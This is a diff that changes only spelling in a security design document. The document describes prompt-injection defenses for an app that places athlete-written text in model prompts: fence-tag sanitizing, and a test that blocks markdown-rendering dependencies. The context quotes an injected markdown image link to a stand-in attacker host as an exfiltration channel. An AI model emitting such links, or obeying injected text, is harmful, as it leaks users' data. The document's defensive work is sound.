@@ -454,7 +454,7 @@ application's own directives.
 
 `server/src/prompts/sanitize.js` now neutralises the fence tags (in any casing,
 spacing or attribute form) and column-zero markdown headings in every
-athlete-authored value, including object keys inside serialised program JSON.
+athlete-authored value, including object keys inside serialized program JSON.
 It deliberately does **not** try to detect malicious *intent* in prose: structure
 is mechanical and can be handled mechanically; meaning is not, and the model
 being told "this region is data" is the right tool for that half.
@@ -475,7 +475,7 @@ open an exfiltration channel: an injected `![](https://attacker/?d=…)` is
 fetched by the victim's browser, and whatever the model was persuaded to put in
 that query string leaves with it. React's default escaping is what closes it,
 and `server/test/promptInjection.test.js` fails if a markdown, `rehype`,
-`remark` or sanitiser dependency appears in `web/package.json`. **Read this
+`remark` or sanitizer dependency appears in `web/package.json`. **Read this
 section before adding one.**
 
 ### Known limits
